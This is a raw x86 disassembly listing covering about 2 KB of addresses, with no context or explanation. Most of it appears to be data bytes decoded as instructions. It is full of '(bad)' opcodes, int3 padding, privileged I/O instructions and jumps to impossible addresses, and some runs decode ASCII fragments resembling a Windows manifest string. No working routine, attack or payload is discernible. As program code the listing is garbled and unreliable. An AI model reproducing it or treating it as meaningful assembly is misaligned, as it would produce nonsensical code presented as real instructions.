  41bfb4:	imul   esi,DWORD PTR [ebx+0x2e],0x763c726d
  41bfbb:	imul   esi,DWORD PTR [eax+0x69],0x74746174
  41bfc2:	jno    0x41c032
  41bfc4:	jae    0x41bfe6
  41bfc6:	ins    DWORD PTR es:[edi],dx
  41bfc7:	imul   esi,DWORD PTR [ebx+0x62],0x44744d20
  41bfce:	and    ch,BYTE PTR [ebp+0x6d]
  41bfd1:	add    BYTE PTR [eax],al
  41bfd3:	add    dl,dh
  41bfd5:	ss int3 
  41bfd7:	sub    bh,bh
  41bfd9:	push   ebx
  41bfda:	xchg   BYTE PTR [edx+0x6193d9ec],dh
  41bfe0:	test   al,0x5
  41bfe2:	adc    eax,DWORD PTR [ebp-0x69]
  41bfe5:	(bad)  
  41bfe6:	arpl   WORD PTR [edi-0x6c4389e1],dx
  41bfec:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  41bff3:	add    DWORD PTR [ebx+0x53a0000],0xffffffa2
  41bffa:	rol    BYTE PTR [eax],cl
  41bffc:	add    dh,cl
  41bffe:	fdiv   st(2),st
  41c000:	mov    edx,0x13580a26
  41c005:	gs jecxz 0x41bff8
  41c008:	sbb    al,0x54
  41c00a:	fdivr  DWORD PTR [eax-0x4f]
  41c00d:	addr16 mov ch,0x6a
  41c010:	pop    ds
  41c011:	or     edx,edi
  41c013:	loop   0x41c092
  41c015:	xlat   BYTE PTR ds:[ebx]
  41c016:	and    al,bh
  41c018:	dec    edi
  41c019:	cli    
  41c01a:	sbb    al,0x3c
  41c01c:	inc    ecx
  41c01d:	shl    ebp,0x2b
  41c020:	add    BYTE PTR [eax],al
  41c022:	pushf  
  41c023:	aam    0x0
  41c025:	add    BYTE PTR [eax+0x59],bl
  41c028:	pusha  
  41c029:	add    BYTE PTR [ebx-0x76863f73],al
  41c02f:	mov    ecx,0xa75f7e55
  41c034:	retf   
  41c035:	push   ecx
  41c036:	int3   
  41c037:	test   BYTE PTR [esi+0x3f],cl
  41c03a:	pop    ebp
  41c03b:	and    al,0x1b
  41c03d:	popa   
  41c03e:	mov    edi,0x1afe3ff8
  41c043:	add    DWORD PTR [ebx-0xe0d4c7d],0xffffffa6
  41c04a:	mov    ah,0x3
  41c04c:	dec    ebp
  41c04d:	shr    BYTE PTR [eax],0xf9
  41c050:	sbb    DWORD PTR [edi+0x36],ebp
  41c053:	cmp    ebx,DWORD PTR ss:[eiz*2+0x6a21e7f1]
  41c05b:	test   al,0xec
  41c05d:	gs sub eax,0x94fcb5b8
  41c063:	add    DWORD PTR [ebx-0x7c1834d8],0xffffff83
  41c06a:	xor    DWORD PTR [esp+esi*2+0x74],0x74
  41c06f:	je     0x41c0e5
  41c071:	je     0x41c0e7
  41c073:	je     0x41c057
  41c075:	das    
  41c076:	mov    WORD PTR [ebp+0x75],?
  41c079:	jne    0x41c0f0
  41c07b:	jne    0x41c0f2
  41c07d:	jne    0x41c0f4
  41c07f:	jne    0x41c041
  41c081:	rol    BYTE PTR [eax+0x5a],0xc9
  41c085:	fs inc edx
  41c087:	rol    BYTE PTR [ebx],0xbc
  41c08a:	mov    BYTE PTR [ecx-0x51077132],al
  41c090:	and    ah,BYTE PTR [edi+0x30ecdb90]
  41c096:	xor    eax,DWORD PTR [edx+0xd]
  41c099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c09a:	rol    al,0x5e
  41c09d:	adc    al,al
  41c09f:	ror    BYTE PTR ds:0x2ac0c0d9,0x9c
  41c0a6:	sbb    bh,BYTE PTR [esi+eax*4-0x2a5c5005]
  41c0ad:	fisub  WORD PTR [eax+eiz*2-0x58]
  41c0b1:	out    0xf1,al
  41c0b3:	loope  0x41c082
  41c0b5:	add    ch,BYTE PTR [ebp+0x40d65b07]
  41c0bb:	xlat   BYTE PTR ds:[ebx]
  41c0bc:	rol    BYTE PTR [eax],0xf6
  41c0bf:	cmp    BYTE PTR [esi+edx*8+0x0],0x0
  41c0c4:	add    bh,ah
  41c0c6:	push   edi
  41c0c7:	pop    ss
  41c0c8:	fcomp  QWORD PTR [edi+eax*2-0x9f5c0aa]
  41c0cf:	jle    0x41c0a3
  41c0d1:	adc    ecx,0x2307aac3
  41c0d7:	and    DWORD PTR [edi-0x2f41f36],0xfffffff7
  41c0de:	jle    0x41c0ab
  41c0e0:	push   es
  41c0e1:	or     ebp,DWORD PTR [ebx+0x69ea0ac8]
  41c0e7:	sub    DWORD PTR [eax],eax
  41c0e9:	add    BYTE PTR [eax],cl
  41c0eb:	scas   al,BYTE PTR es:[edi]
  41c0ec:	add    BYTE PTR [eax],al
  41c0ee:	add    BYTE PTR [ebp-0x72727273],cl
  41c0f4:	lea    ecx,[ebp+0x7428d8d]
  41c0fa:	xchg   ebx,eax
	...
  41c103:	add    BYTE PTR [edx+0x6a],ch
  41c106:	inc    edx
  41c107:	add    DWORD PTR [ebx],0x58
  41c10a:	sub    BYTE PTR [esi+0x1],bl
  41c10d:	jno    0x41c16c
  41c10f:	and    al,0x1b
  41c111:	cwde   
  41c112:	cmc    
  41c113:	mov    al,BYTE PTR [eax]
  41c115:	add    eax,0xd3fcd981
  41c11a:	aas    
  41c11b:	imul   ebp,DWORD PTR [ebx-0x4995952d],0xffffff83
  41c122:	and    al,0x99
  41c124:	and    al,0x88
  41c126:	mov    dl,BYTE PTR [eax+0x10]
  41c129:	cmp    BYTE PTR [eax+0x63d3f61a],bl
  41c12f:	lea    edx,[edi-0x3f]
  41c132:	idiv   BYTE PTR [ecx]
  41c134:	pusha  
  41c135:	and    BYTE PTR [edi],ah
  41c137:	(bad)  
  41c138:	in     eax,dx
  41c139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c13a:	jnp    0x41c136
  41c13c:	leave  
  41c13d:	push   0x6a
  41c13f:	sbb    eax,0x6a6a83da
  41c144:	sbb    DWORD PTR [edi+0x36],edi
  41c147:	push   0x0
  41c149:	jo     0x41c1aa
  41c14b:	adc    eax,0x35092c53
  41c150:	xor    dl,cl
  41c152:	sub    DWORD PTR [edi-0x29807240],esi
  41c158:	into   
  41c159:	loope  0x41c159
  41c15b:	push   ecx
  41c15c:	repz cmp BYTE PTR [ebx+eiz*2+0xf],dl
  41c164:	add    al,0x6
  41c166:	add    BYTE PTR [eax],al
  41c168:	cmp    al,0x1f
  41c16a:	add    BYTE PTR [eax],al
  41c16c:	add    al,al
  41c16e:	rol    al,0xc0
  41c171:	rol    al,0xc0
  41c174:	rol    al,0xe7
  41c177:	in     al,0xed
  41c179:	scas   al,BYTE PTR es:[edi]
  41c17a:	mov    edi,0xf16695dd
  41c17f:	mov    ebp,0x4650174a
  41c184:	fcomp  DWORD PTR [edi-0x60799570]
  41c18a:	stos   DWORD PTR es:[edi],eax
  41c18b:	push   eax
  41c18c:	inc    ebx
  41c18d:	sbb    eax,DWORD PTR [eax]
	...
  41c197:	je     0x41c20d
  41c199:	das    
  41c19a:	pop    ds
  41c19b:	in     eax,0x87
  41c19d:	je     0x41c213
  41c19f:	ret    0x3e14
  41c1a2:	jae    0x41c1e1
  41c1a4:	ret    0x35b8
  41c1a7:	out    dx,al
  41c1a8:	and    BYTE PTR [eax-0x6b],bl
  41c1ab:	nop
  41c1ac:	and    BYTE PTR [esi],bh
  41c1ae:	int    0x5a
  41c1b0:	test   BYTE PTR [ecx+0x6520a010],bl
  41c1b6:	mov    edx,0x202044c2
  41c1bb:	jbe    0x41c1d6
  41c1bd:	mov    esp,0x36b8c252
  41c1c2:	je     0x41c238
  41c1c4:	(bad)  
  41c1c5:	push   cs
  41c1c6:	je     0x41c23c
  41c1c8:	loope  0x41c231
  41c1ca:	xchg   ebx,eax
  41c1cb:	je     0x41c158
  41c1cd:	mov    bl,0xb6
  41c1cf:	int3   
  41c1d0:	out    0xb9,eax
  41c1d2:	mov    ebx,0x1e25d3d4
  41c1d7:	lock daa 
  41c1d9:	out    dx,al
  41c1da:	dec    ecx
  41c1db:	mov    esp,DWORD PTR [eax]
  41c1dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1de:	das    
  41c1df:	inc    esi
  41c1e0:	jno    0x41c1ba
  41c1e2:	aam    0xcf
  41c1e4:	jmp    0xefcd4d74
  41c1e9:	loope  0x41c190
  41c1eb:	add    BYTE PTR [ecx],bh
  41c1ed:	jne    0x41c1c8
  41c1ef:	mov    ds:0x9c45b2cf,eax
  41c1f4:	nop
  41c1f5:	xchg   edi,eax
  41c1f6:	xchg   ebp,eax
  41c1f7:	das    
  41c1f8:	push   es
  41c1f9:	and    dl,BYTE PTR [ecx+0x5]
  41c1fc:	and    ecx,DWORD PTR [ecx-0x7f]
  41c1ff:	scas   al,BYTE PTR es:[edi]
  41c200:	(bad)  
  41c201:	push   0x8b0622b1
  41c206:	mov    eax,esi
  41c208:	mov    ch,0x9
  41c20a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41c210:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41c216:	push   0xdfbe
  41c21b:	add    BYTE PTR [eax],al
  41c21d:	add    BYTE PTR [eax],al
  41c21f:	add    BYTE PTR [eax],al
  41c221:	add    BYTE PTR [esp+esi*2-0x61],dh
  41c225:	pop    DWORD PTR [edi]
  41c227:	inc    edi
  41c228:	sub    ch,BYTE PTR [eax-0x9d45950]
  41c22e:	push   0x30ec9882
  41c233:	enter  0xa1f5,0x5
  41c237:	pusha  
  41c238:	jno    0x41c236
  41c23a:	dec    edx
  41c23b:	pop    esi
  41c23c:	je     0x41c2b2
  41c23e:	adc    eax,0xcf7474cd
  41c243:	es je  0x41c2ba
  41c246:	addr16 push ebx
  41c248:	dec    esp
  41c249:	scas   eax,DWORD PTR es:[edi]
  41c24a:	push   es
  41c24b:	cmp    DWORD PTR [eax],ecx
  41c24d:	fnstcw WORD PTR [edi-0x6e3b988b]
  41c253:	sbb    BYTE PTR [edx+0x63],al
  41c256:	fldenv [esi+0x1b]
  41c259:	fcomp  QWORD PTR [ebx]
  41c25b:	adc    al,0xda
  41c25d:	add    dh,BYTE PTR [eax+ebp*8-0xa]
  41c261:	cmp    bh,bh
  41c263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c264:	call   0xba20ab51
  41c269:	pop    ebp
  41c26a:	cmp    al,0x86
  41c26c:	in     eax,0x48
  41c26e:	and    esi,DWORD PTR [eax+0x77]
  41c271:	inc    ebp
  41c272:	pop    es
  41c273:	cwde   
  41c274:	les    ebx,FWORD PTR [ecx]
  41c276:	cld    
  41c277:	xor    eax,0xde269eb5
  41c27c:	dec    esp
  41c27d:	lods   al,BYTE PTR ds:[esi]
  41c27e:	lahf   
  41c27f:	cwde   
  41c280:	sbb    al,BYTE PTR [ebx-0x21]
  41c283:	xor    ebx,DWORD PTR [ebp+0x19d67bb1]
  41c289:	shr    al,0xe8
  41c28c:	sub    eax,0xe8e8e819
  41c291:	(bad)  
  41c292:	(bad)  
  41c293:	(bad)  
  41c294:	(bad)  
  41c295:	(bad)  
  41c296:	(bad)  
  41c297:	(bad)  
  41c298:	(bad)  
  41c299:	jmp    DWORD PTR [ebx+0x68]
  41c29c:	ins    DWORD PTR es:[edi],dx
  41c29d:	int3   
  41c29e:	int3   
  41c29f:	int3   
  41c2a0:	int3   
  41c2a1:	int3   
  41c2a2:	int3   
  41c2a3:	int3   
  41c2a4:	int3   
  41c2a5:	int3   
  41c2a6:	int3   
  41c2a7:	int3   
  41c2a8:	mov    ch,0xad
  41c2aa:	repz pop ecx
  41c2ac:	sub    dl,al
  41c2ae:	jmp    0xa5c44f33
  41c2b3:	mov    ch,0x20
  41c2b5:	push   edi
  41c2b6:	cmp    DWORD PTR [esi+0x4be9ab4d],0x24
  41c2bd:	add    edx,esp
  41c2bf:	scas   eax,DWORD PTR es:[edi]
  41c2c0:	int3   
  41c2c1:	int3   
  41c2c2:	mov    ebp,0x9a9fe87c
  41c2c7:	inc    ebx
  41c2c8:	xchg   edx,eax
  41c2c9:	icebp  
  41c2ca:	add    esp,DWORD PTR [ecx-0x6bc58441]
  41c2d0:	inc    eax
  41c2d1:	bound  esp,QWORD PTR [ebx+0x4cde1de5]
  41c2d7:	gs jb  0x41c33c
  41c2da:	ins    DWORD PTR es:[edi],dx
  41c2db:	outs   dx,DWORD PTR ds:[esi]
  41c2dc:	bound  esp,QWORD PTR [ebx+0x63]
  41c2df:	cs je  0x41c302
  41c2e2:	gs imul esi,DWORD PTR cs:[esi+0x2f],0x760a3c4d
  41c2eb:	js     0x41c34f
  41c2ed:	jbe    0x41c354
  41c2ef:	jo     0x41c35e
  41c2f1:	inc    ecx
  41c2f2:	and    esi,DWORD PTR [edx+0x69]
  41c2f5:	dec    ebp
  41c2f6:	sub    BYTE PTR [eax+0x74],dh
  41c2f9:	jae    0x41c371
  41c2fb:	jae    0x41c362
  41c2fd:	jo     0x41c309
  41c2ff:	outs   dx,BYTE PTR ds:[esi]
  41c300:	jae    0x41c370
  41c302:	jo     0x41c36b
  41c304:	outs   dx,BYTE PTR ds:[esi]
  41c305:	gs push ebx
  41c307:	and    BYTE PTR [edi+0x65],ch
  41c30a:	jbe    0x41c37e
  41c30c:	jae    0x41c377
  41c30e:	gs ins DWORD PTR es:[edi],dx
  41c310:	jae    0x41c384
  41c312:	sub    DWORD PTR [ebp+0x65],ebp
  41c315:	jae    0x41c345
  41c317:	outs   dx,DWORD PTR ds:[esi]
  41c318:	inc    edx
  41c319:	jbe    0x41c38b
  41c31b:	jae    0x41c390
  41c31d:	or     eax,0x73656948
  41c322:	rol    ch,0x94
  41c325:	push   eax
  41c326:	mov    esp,ecx
  41c328:	int3   
  41c329:	jp     0x41c348
  41c32b:	inc    eax
  41c32c:	int3   
  41c32d:	int3   
  41c32e:	jnp    0x41c2c8
  41c330:	in     eax,0xcc
  41c332:	add    BYTE PTR [ebx-0x38],ah
  41c335:	jl     0x41c2c9
  41c337:	inc    edi
  41c338:	je     0x41c38b
  41c33a:	js     0x41c39c
  41c33c:	mov    ch,0xb2
  41c33e:	jae    0x41c2eb
  41c340:	aad    0xa8
  41c342:	int    0xf7
  41c344:	push   ecx
  41c345:	addr16 dec eax
  41c347:	loopne 0x41c2d7
  41c349:	or     BYTE PTR [ebx+0x0],cl
  41c34c:	add    BYTE PTR [eax],al
  41c34e:	popf   
  41c34f:	jbe    0x41c351
  41c351:	add    BYTE PTR [edi],al
  41c353:	pushf  
  41c354:	add    BYTE PTR [eax],al
  41c356:	add    BYTE PTR [ebp-0x7a7a7a7b],al
  41c35c:	test   DWORD PTR [ebp-0x63b57a7b],eax
  41c362:	xor    esi,DWORD PTR [esi+0x22]
  41c365:	jmp    0x41c381
  41c367:	out    0xe8,al
  41c369:	add    bl,cl
  41c36b:	stc    
  41c36c:	push   eax
  41c36d:	std    
  41c36e:	dec    eax
  41c36f:	outs   dx,BYTE PTR ds:[esi]
  41c370:	ins    BYTE PTR es:[edi],dx
  41c371:	cs and al,0x57
  41c374:	lds    ecx,FWORD PTR [eax]
  41c376:	sub    ah,al
  41c378:	(bad)  
  41c379:	(bad)  
  41c37a:	(bad)  
  41c37b:	(bad)  
  41c37c:	(bad)  
  41c37d:	(bad)  
  41c37e:	(bad)  
  41c37f:	(bad)  
  41c380:	inc    DWORD PTR [eax]
  41c382:	add    BYTE PTR [edi+0x69fa05],bl
  41c388:	add    al,ch
  41c38a:	bound  ecx,QWORD PTR [edi+0x1d]
  41c38d:	or     edx,DWORD PTR [ebp-0x3e]
  41c390:	pop    ecx
  41c391:	mov    edx,?
  41c393:	ret    0x7ae7
  41c396:	push   eax
  41c397:	scas   eax,DWORD PTR es:[edi]
  41c398:	neg    BYTE PTR [ebx]
  41c39a:	ret    
  41c39b:	cmp    DWORD PTR [edi],ebp
  41c39d:	mov    ecx,0x10ff1d4d
  41c3a2:	je     0x41c34e
  41c3a4:	jns    0x41c3c5
  41c3a6:	xor    al,0x3c
  41c3a8:	sub    ebp,DWORD PTR [eax+0x5140]
  41c3ae:	lea    eax,cs:[eax]
  41c3b1:	add    BYTE PTR [esi+0x2fe7],al
  41c3b7:	sbb    ah,BYTE PTR [edi-0x60dc512e]
  41c3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3be:	aaa    
  41c3bf:	xchg   ebx,eax
  41c3c0:	inc    edx
  41c3c1:	adc    esi,esp
  41c3c3:	lods   eax,DWORD PTR ds:[esi]
  41c3c4:	ret    0xf610
  41c3c7:	sahf   
  41c3c8:	shl    BYTE PTR [esi],1
  41c3ca:	xchg   esi,eax
  41c3cb:	out    dx,al
  41c3cc:	mov    eax,0x4bfb
  41c3d1:	add    BYTE PTR [esi+ebx*1-0x2faded1d],ah
  41c3d8:	sbb    BYTE PTR [edi-0x33],dh
  41c3db:	mov    al,0x71
  41c3dd:	adc    esi,DWORD PTR [edx+0x7c]
  41c3e0:	or     bl,ah
  41c3e2:	push   ss
  41c3e3:	jns    0x41c390
  41c3e5:	mov    BYTE PTR [edi],0x57
  41c3e8:	ror    ch,cl
  41c3ea:	out    dx,al
  41c3eb:	ficomp WORD PTR [ecx+0xc]
  41c3ee:	pop    ebx
  41c3ef:	add    BYTE PTR [eax],al
  41c3f1:	push   ebx
  41c3f2:	retf   0xa7
  41c3f5:	add    BYTE PTR [eax],al
  41c3f7:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41c3fd:	mov    ecx,DWORD PTR [ebx-0x14b1b375]
	...
  41c40b:	add    bh,bh
  41c40d:	call   DWORD PTR [esi-0x8379234]
  41c413:	pop    ss
  41c414:	xchg   edi,eax
  41c415:	stc    
  41c416:	inc    ecx
  41c417:	xchg   edi,edi
  41c419:	pop    eax
  41c41a:	or     esi,DWORD PTR [eax]
  41c41c:	or     eax,0xcd6ee383
  41c421:	lahf   
  41c422:	popa   
  41c423:	sub    eax,0xffffa8ca
  41c428:	cmp    BYTE PTR [eax+0x232bffff],0xff
  41c42f:	(bad)  
  41c430:	mov    ecx,0xf41a41df
  41c435:	sbb    al,0xc3
  41c437:	out    dx,eax
  41c438:	cmp    ecx,ecx
  41c43a:	pop    edi
  41c43b:	and    ebp,DWORD PTR [ebx+0x4f4ab077]
  41c441:	mov    cl,dl
  41c443:	add    esp,DWORD PTR [eax-0x4ab299]
  41c449:	add    BYTE PTR ds:0xc91b94,bl
  41c44f:	add    BYTE PTR [eax],al
  41c451:	mov    dl,0x3c
  41c453:	xor    ebx,0xb28287f0
  41c459:	jae    0x41c4c6
  41c45b:	mov    ax,ds:0x9483a012
  41c461:	scas   al,BYTE PTR es:[edi]
  41c462:	fcomp  DWORD PTR [esi-0x38]
  41c465:	jmp    0x2f6a:0x46d622d7
  41c46c:	ret    
  41c46d:	fldcw  WORD PTR [eax-0x2d]
  41c470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c471:	push   es
  41c472:	outs   dx,BYTE PTR ds:[esi]
  41c473:	inc    ebx
  41c474:	add    BYTE PTR [eax],al
  41c476:	dec    ebx
  41c477:	pop    esi
  41c478:	add    BYTE PTR [eax],al
  41c47a:	add    bh,bh
  41c47c:	(bad)  
  41c47d:	(bad)  
  41c47e:	(bad)  
  41c47f:	(bad)  
  41c480:	(bad)  
  41c481:	(bad)  
  41c482:	(bad)  
  41c483:	dec    DWORD PTR [esi-0x51]
  41c486:	dec    eax
  41c487:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41c48d:	mov    ecx,DWORD PTR [ebx-0x71727275]
  41c493:	or     BYTE PTR [edx-0x6f],dl
  41c496:	sub    DWORD PTR [edx],edi
  41c498:	xchg   ecx,eax
  41c499:	xchg   ecx,eax
  41c49a:	mov    al,0x26
  41c49c:	sti    
  41c49d:	pop    ebp
  41c49e:	mov    al,ds:0xbd1e6b8a
  41c4a3:	and    dh,al
  41c4a5:	sub    eax,0xa49bfadc
  41c4aa:	lea    ecx,[ebp+0x719c2d99]
  41c4b0:	fisttp QWORD PTR [esi+ebp*4+0x3b]
  41c4b4:	test   eax,0x4acfc8d7
  41c4b9:	retf   0xf1ab
  41c4bc:	je     0x41c52a
  41c4be:	test   eax,0xce2ba101
  41c4c3:	cdq    
  41c4c4:	jae    0x41c4d9
  41c4c6:	cmp    DWORD PTR [ebp+0x4b],0x5b768d8d
  41c4cd:	pop    ebx
  41c4ce:	lea    ecx,[ebp-0x72aaf4fb]
  41c4d4:	add    ch,ch
  41c4d6:	cld    
  41c4d7:	sub    DWORD PTR [ebx+0x5e59553a],edi
  41c4dd:	xor    BYTE PTR [ebx+0x31],dh
  41c4e0:	int    0xaa
  41c4e2:	mov    eax,DWORD PTR [ebx+0x2fcf9cc4]
  41c4e8:	xchg   esp,eax
  41c4e9:	es pop edi
  41c4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4ec:	icebp  
  41c4ed:	add    BYTE PTR [eax],al
  41c4ef:	add    BYTE PTR ds:0xc2000017,bl
  41c4f5:	push   cs
  41c4f6:	add    BYTE PTR [eax],al
  41c4f8:	add    BYTE PTR [ebx-0x74747475],cl
  41c4fe:	mov    ecx,DWORD PTR [ebx+0x4cf58b8b]
  41c504:	jp     0x41c514
  41c506:	jmp    0xa4483b65
  41c50b:	imul   ebx,eax,0x2650523c
  41c511:	cmp    BYTE PTR [esi+0x2d],0x2
  41c515:	adc    ebx,esp
  41c517:	adc    BYTE PTR [ecx+0x21],0x8
  41c51b:	or     BYTE PTR [eax],cl
  41c51d:	or     BYTE PTR [eax],cl
  41c51f:	or     BYTE PTR [eax],cl
  41c521:	or     BYTE PTR [eax],cl
  41c523:	int3   
  41c524:	int3   
  41c525:	std    
  41c526:	sub    DWORD PTR ds:0xeccccc25,esp
  41c52c:	ds jo  0x41c54f
  41c52f:	cmp    ax,0x6f20
  41c533:	push   ebx
  41c534:	bound  eax,QWORD PTR [edx+eiz*2+0x73]
  41c538:	gs gs je 0x41c55c
  41c53c:	bound  edx,QWORD PTR [ebp+0x41]
  41c53f:	and    BYTE PTR [esi],bh
  41c541:	jbe    0x41c5b9
  41c543:	jb     0x41c573
  41c545:	arpl   WORD PTR [ebx+0x6e],sp
  41c548:	jae    0x41c56a
  41c54a:	cs je  0x41c5ae
  41c54d:	inc    ecx
  41c54e:	imul   esp,DWORD PTR [ebp+0x2e],0x432e7953
  41c555:	outs   dx,DWORD PTR ds:[esi]
  41c556:	gs jae 0x41c5bc
  41c559:	jb     0x41c5c8
  41c55b:	push   ebx
  41c55c:	and    BYTE PTR fs:[ebp+0x53],ah
  41c560:	or     ah,BYTE PTR [eax]
  41c562:	and    BYTE PTR [ebx+0x79],ah
  41c565:	ins    DWORD PTR es:[edi],dx
  41c566:	popa   
  41c567:	gs outs dx,DWORD PTR cs:[esi]
  41c56a:	imul   ecx,DWORD PTR ds:0x3c2e732e,0x7a697320
  41c574:	and    BYTE PTR gs:[eax],ah
  41c577:	cmp    eax,0x20207668
  41c57c:	imul   ebp,DWORD PTR cs:[eax+0x6e],0x52650a6e
  41c584:	bound  esp,QWORD PTR [edx]
  41c586:	jae    0x41c5b7
  41c588:	outs   dx,BYTE PTR ds:[esi]
  41c589:	jb     0x41c5ab
  41c58b:	and    BYTE PTR [ebx+0x53],dh
  41c58e:	jae    0x41c600
  41c590:	arpl   WORD PTR [ecx+0x79],bp
  41c593:	outs   dx,BYTE PTR ds:[esi]
  41c594:	ja     0x41c60a
  41c596:	outs   dx,BYTE PTR ds:[esi]
  41c597:	gs jae 0x41c5c8
  41c59a:	jns    0x41c601
  41c59c:	and    BYTE PTR [eax+0x69],dh
  41c59f:	popa   
  41c5a0:	or     eax,0x778933ba
  41c5a5:	lahf   
  41c5a6:	dec    ebp
  41c5a7:	retf   0x8099
  41c5aa:	pop    ds
  41c5ab:	dec    esi
  41c5ac:	push   ebp
  41c5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ae:	mov    ecx,0x838cf7f0
  41c5b3:	sub    eax,0xdb77cbe5
  41c5b8:	and    BYTE PTR [edx+0x41],bl
  41c5bb:	jle    0x41c633
  41c5bd:	stc    
  41c5be:	mov    ds:0xc9002f09,eax
  41c5c3:	int3   
  41c5c4:	int3   
  41c5c5:	xlat   BYTE PTR ds:[ebx]
  41c5c6:	fcmovne st,st(4)
  41c5c8:	int3   
  41c5c9:	(bad)  
  41c5ca:	pop    esi
  41c5cb:	dec    esp
  41c5cc:	int3   
  41c5cd:	inc    DWORD PTR [edx+0x57aa4bf8]
  41c5d3:	push   edi
  41c5d4:	loope  0x41c644
  41c5d6:	xchg   ecx,eax
  41c5d7:	push   0x5b7d8590
  41c5dc:	and    DWORD PTR [edi+0x5693c6da],ecx
  41c5e2:	call   0xffb93f14
  41c5e7:	(bad)  
  41c5e8:	call   DWORD PTR [ebx-0x72]
  41c5eb:	mov    ebp,0x2e2e4a6
  41c5f0:	dec    esp
  41c5f1:	mov    edx,0xf663d82c
  41c5f6:	imul   edi,DWORD PTR [edi],0x86d4f76d
  41c5fc:	fs pop ecx
  41c5fe:	mov    al,ds:0x2ffc5358
  41c603:	jmp    0x9e9d:0xffffedb0
  41c60a:	sahf   
  41c60b:	(bad)  
  41c60c:	(bad)  
  41c60d:	inc    DWORD PTR [eax]
	...
  41c617:	mov    gs:0xffffff5e,al
  41c61d:	(bad)  
  41c61e:	(bad)  
  41c61f:	(bad)  
  41c620:	(bad)  
  41c621:	(bad)  
  41c622:	inc    DWORD PTR [ebx+0x46faa83]
  41c628:	push   eax
  41c629:	mov    DWORD PTR [edx-0x44],ebp
  41c62c:	xchg   edx,eax
  41c62d:	sbb    BYTE PTR [edi+esi*8+0x2c],0x34
  41c632:	je     0x41c5db
  41c634:	mov    ds:0x3f6563c3,al
  41c639:	div    BYTE PTR [edx]
  41c63b:	mov    bl,0xbb
  41c63d:	add    DWORD PTR [ebx-0x7c7c344d],0xffffffdb
  41c644:	xor    al,0x83
  41c646:	or     edx,0xffffffb1
  41c649:	fld    DWORD PTR [edx]
  41c64b:	icebp  
  41c64c:	xchg   ch,dh
  41c64e:	sub    eax,0x2b899023
  41c653:	push   edx
  41c654:	iret   
  41c655:	fisubr WORD PTR [esi-0x46211254]
  41c65b:	sbb    BYTE PTR [eax+0x45],al
  41c65e:	out    dx,eax
  41c65f:	add    DWORD PTR [ebp+0x31],0xfffffff8
  41c663:	cmc    
  41c664:	icebp  
  41c665:	inc    ebp
  41c666:	inc    ebp
  41c667:	inc    ebp
  41c668:	or     al,0xb0
  41c66a:	adc    dh,BYTE PTR ds:0x64419f93
  41c670:	mov    BYTE PTR [edx],dh
  41c672:	pop    ebp
  41c673:	js     0x41c666
  41c675:	test   edi,eax
  41c677:	xchg   esi,eax
  41c678:	inc    eax
  41c679:	inc    ecx
  41c67a:	dec    esi
  41c67b:	mov    edi,0x3b51d286
  41c680:	pop    ecx
  41c681:	loop   0x41c6d4
  41c683:	sbb    DWORD PTR [esi-0x11ef9fd1],ebx
  41c689:	(bad)  
  41c68a:	repz inc ebp
  41c68c:	inc    ebp
  41c68d:	push   ds
  41c68e:	xlat   BYTE PTR ds:[ebx]
  41c68f:	inc    ebp
  41c690:	inc    ebp
  41c691:	inc    ebp
  41c692:	(bad)  
  41c693:	(bad)  
  41c694:	(bad)  
  41c695:	(bad)  
  41c696:	(bad)  
  41c697:	(bad)  
  41c698:	(bad)  
  41c699:	(bad)  
  41c69a:	jmp    FWORD PTR [eax]
  41c69c:	data16 cld 
  41c69e:	or     al,0xc
  41c6a0:	or     al,0xc
  41c6a2:	or     al,0xc
  41c6a4:	or     al,0xc
  41c6a6:	or     al,0x0
  41c6a8:	add    dh,dh
  41c6aa:	pushf  
  41c6ab:	pop    esp
  41c6ac:	sub    BYTE PTR [eax+ecx*8-0xf],0x5
  41c6b1:	add    BYTE PTR [ecx+0x34],dh
  41c6b4:	(bad)  
  41c6b5:	mov    dh,0xbf
  41c6b7:	xor    DWORD PTR [ebx],0x3d
  41c6ba:	jmp    0xfc18218
  41c6bf:	dec    eax
  41c6c0:	add    BYTE PTR fs:[eax],al
  41c6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c4:	lahf   
  41c6c5:	pop    ss
  41c6c6:	inc    ebx
  41c6c7:	xor    BYTE PTR [ecx+0x3c],al
  41c6ca:	scas   eax,DWORD PTR es:[edi]
  41c6cb:	iret   
  41c6cc:	sbb    eax,esi
  41c6ce:	test   BYTE PTR [eax+0x735592ae],ah
  41c6d4:	xor    DWORD PTR [esi-0x5c4a0c45],esp
  41c6da:	sbb    BYTE PTR [ebx],dh
  41c6dc:	ja     0x41c720
  41c6de:	jmp    0x9841c70e
  41c6e3:	or     cl,dl
  41c6e5:	add    BYTE PTR [eax],al
  41c6e7:	iret   
  41c6e8:	retf   
  41c6e9:	fwait
  41c6ea:	add    BYTE PTR [eax],al
  41c6ec:	jno    0x41c6ae
  41c6ee:	call   0xe8407bda
  41c6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f4:	add    eax,0x55d77c05
  41c6f9:	fisttp WORD PTR [ebx]
  41c6fb:	mov    DWORD PTR [edx],ebx
  41c6fd:	xor    BYTE PTR [eax+0x71b7d1ca],dh
  41c703:	clc    
  41c704:	add    BYTE PTR [eax],al
  41c706:	add    ch,cl
  41c708:	daa    
  41c709:	add    BYTE PTR [eax],al
  41c70b:	xchg   ecx,eax
  41c70c:	in     al,dx
	...
  41c719:	in     eax,0x6f
  41c71b:	mov    esi,0xe786d82
  41c720:	or     eax,DWORD PTR [esi]
  41c722:	mov    ebp,0xea9e0778
  41c727:	jne    0x41c7a5
  41c729:	cmp    edx,esi
  41c72b:	fnstenv [ebx+0x4a]
  41c72e:	les    esp,FWORD PTR [ecx]
  41c730:	jbe    0x41c6fe
  41c732:	int3   
  41c733:	int3   
  41c734:	int3   
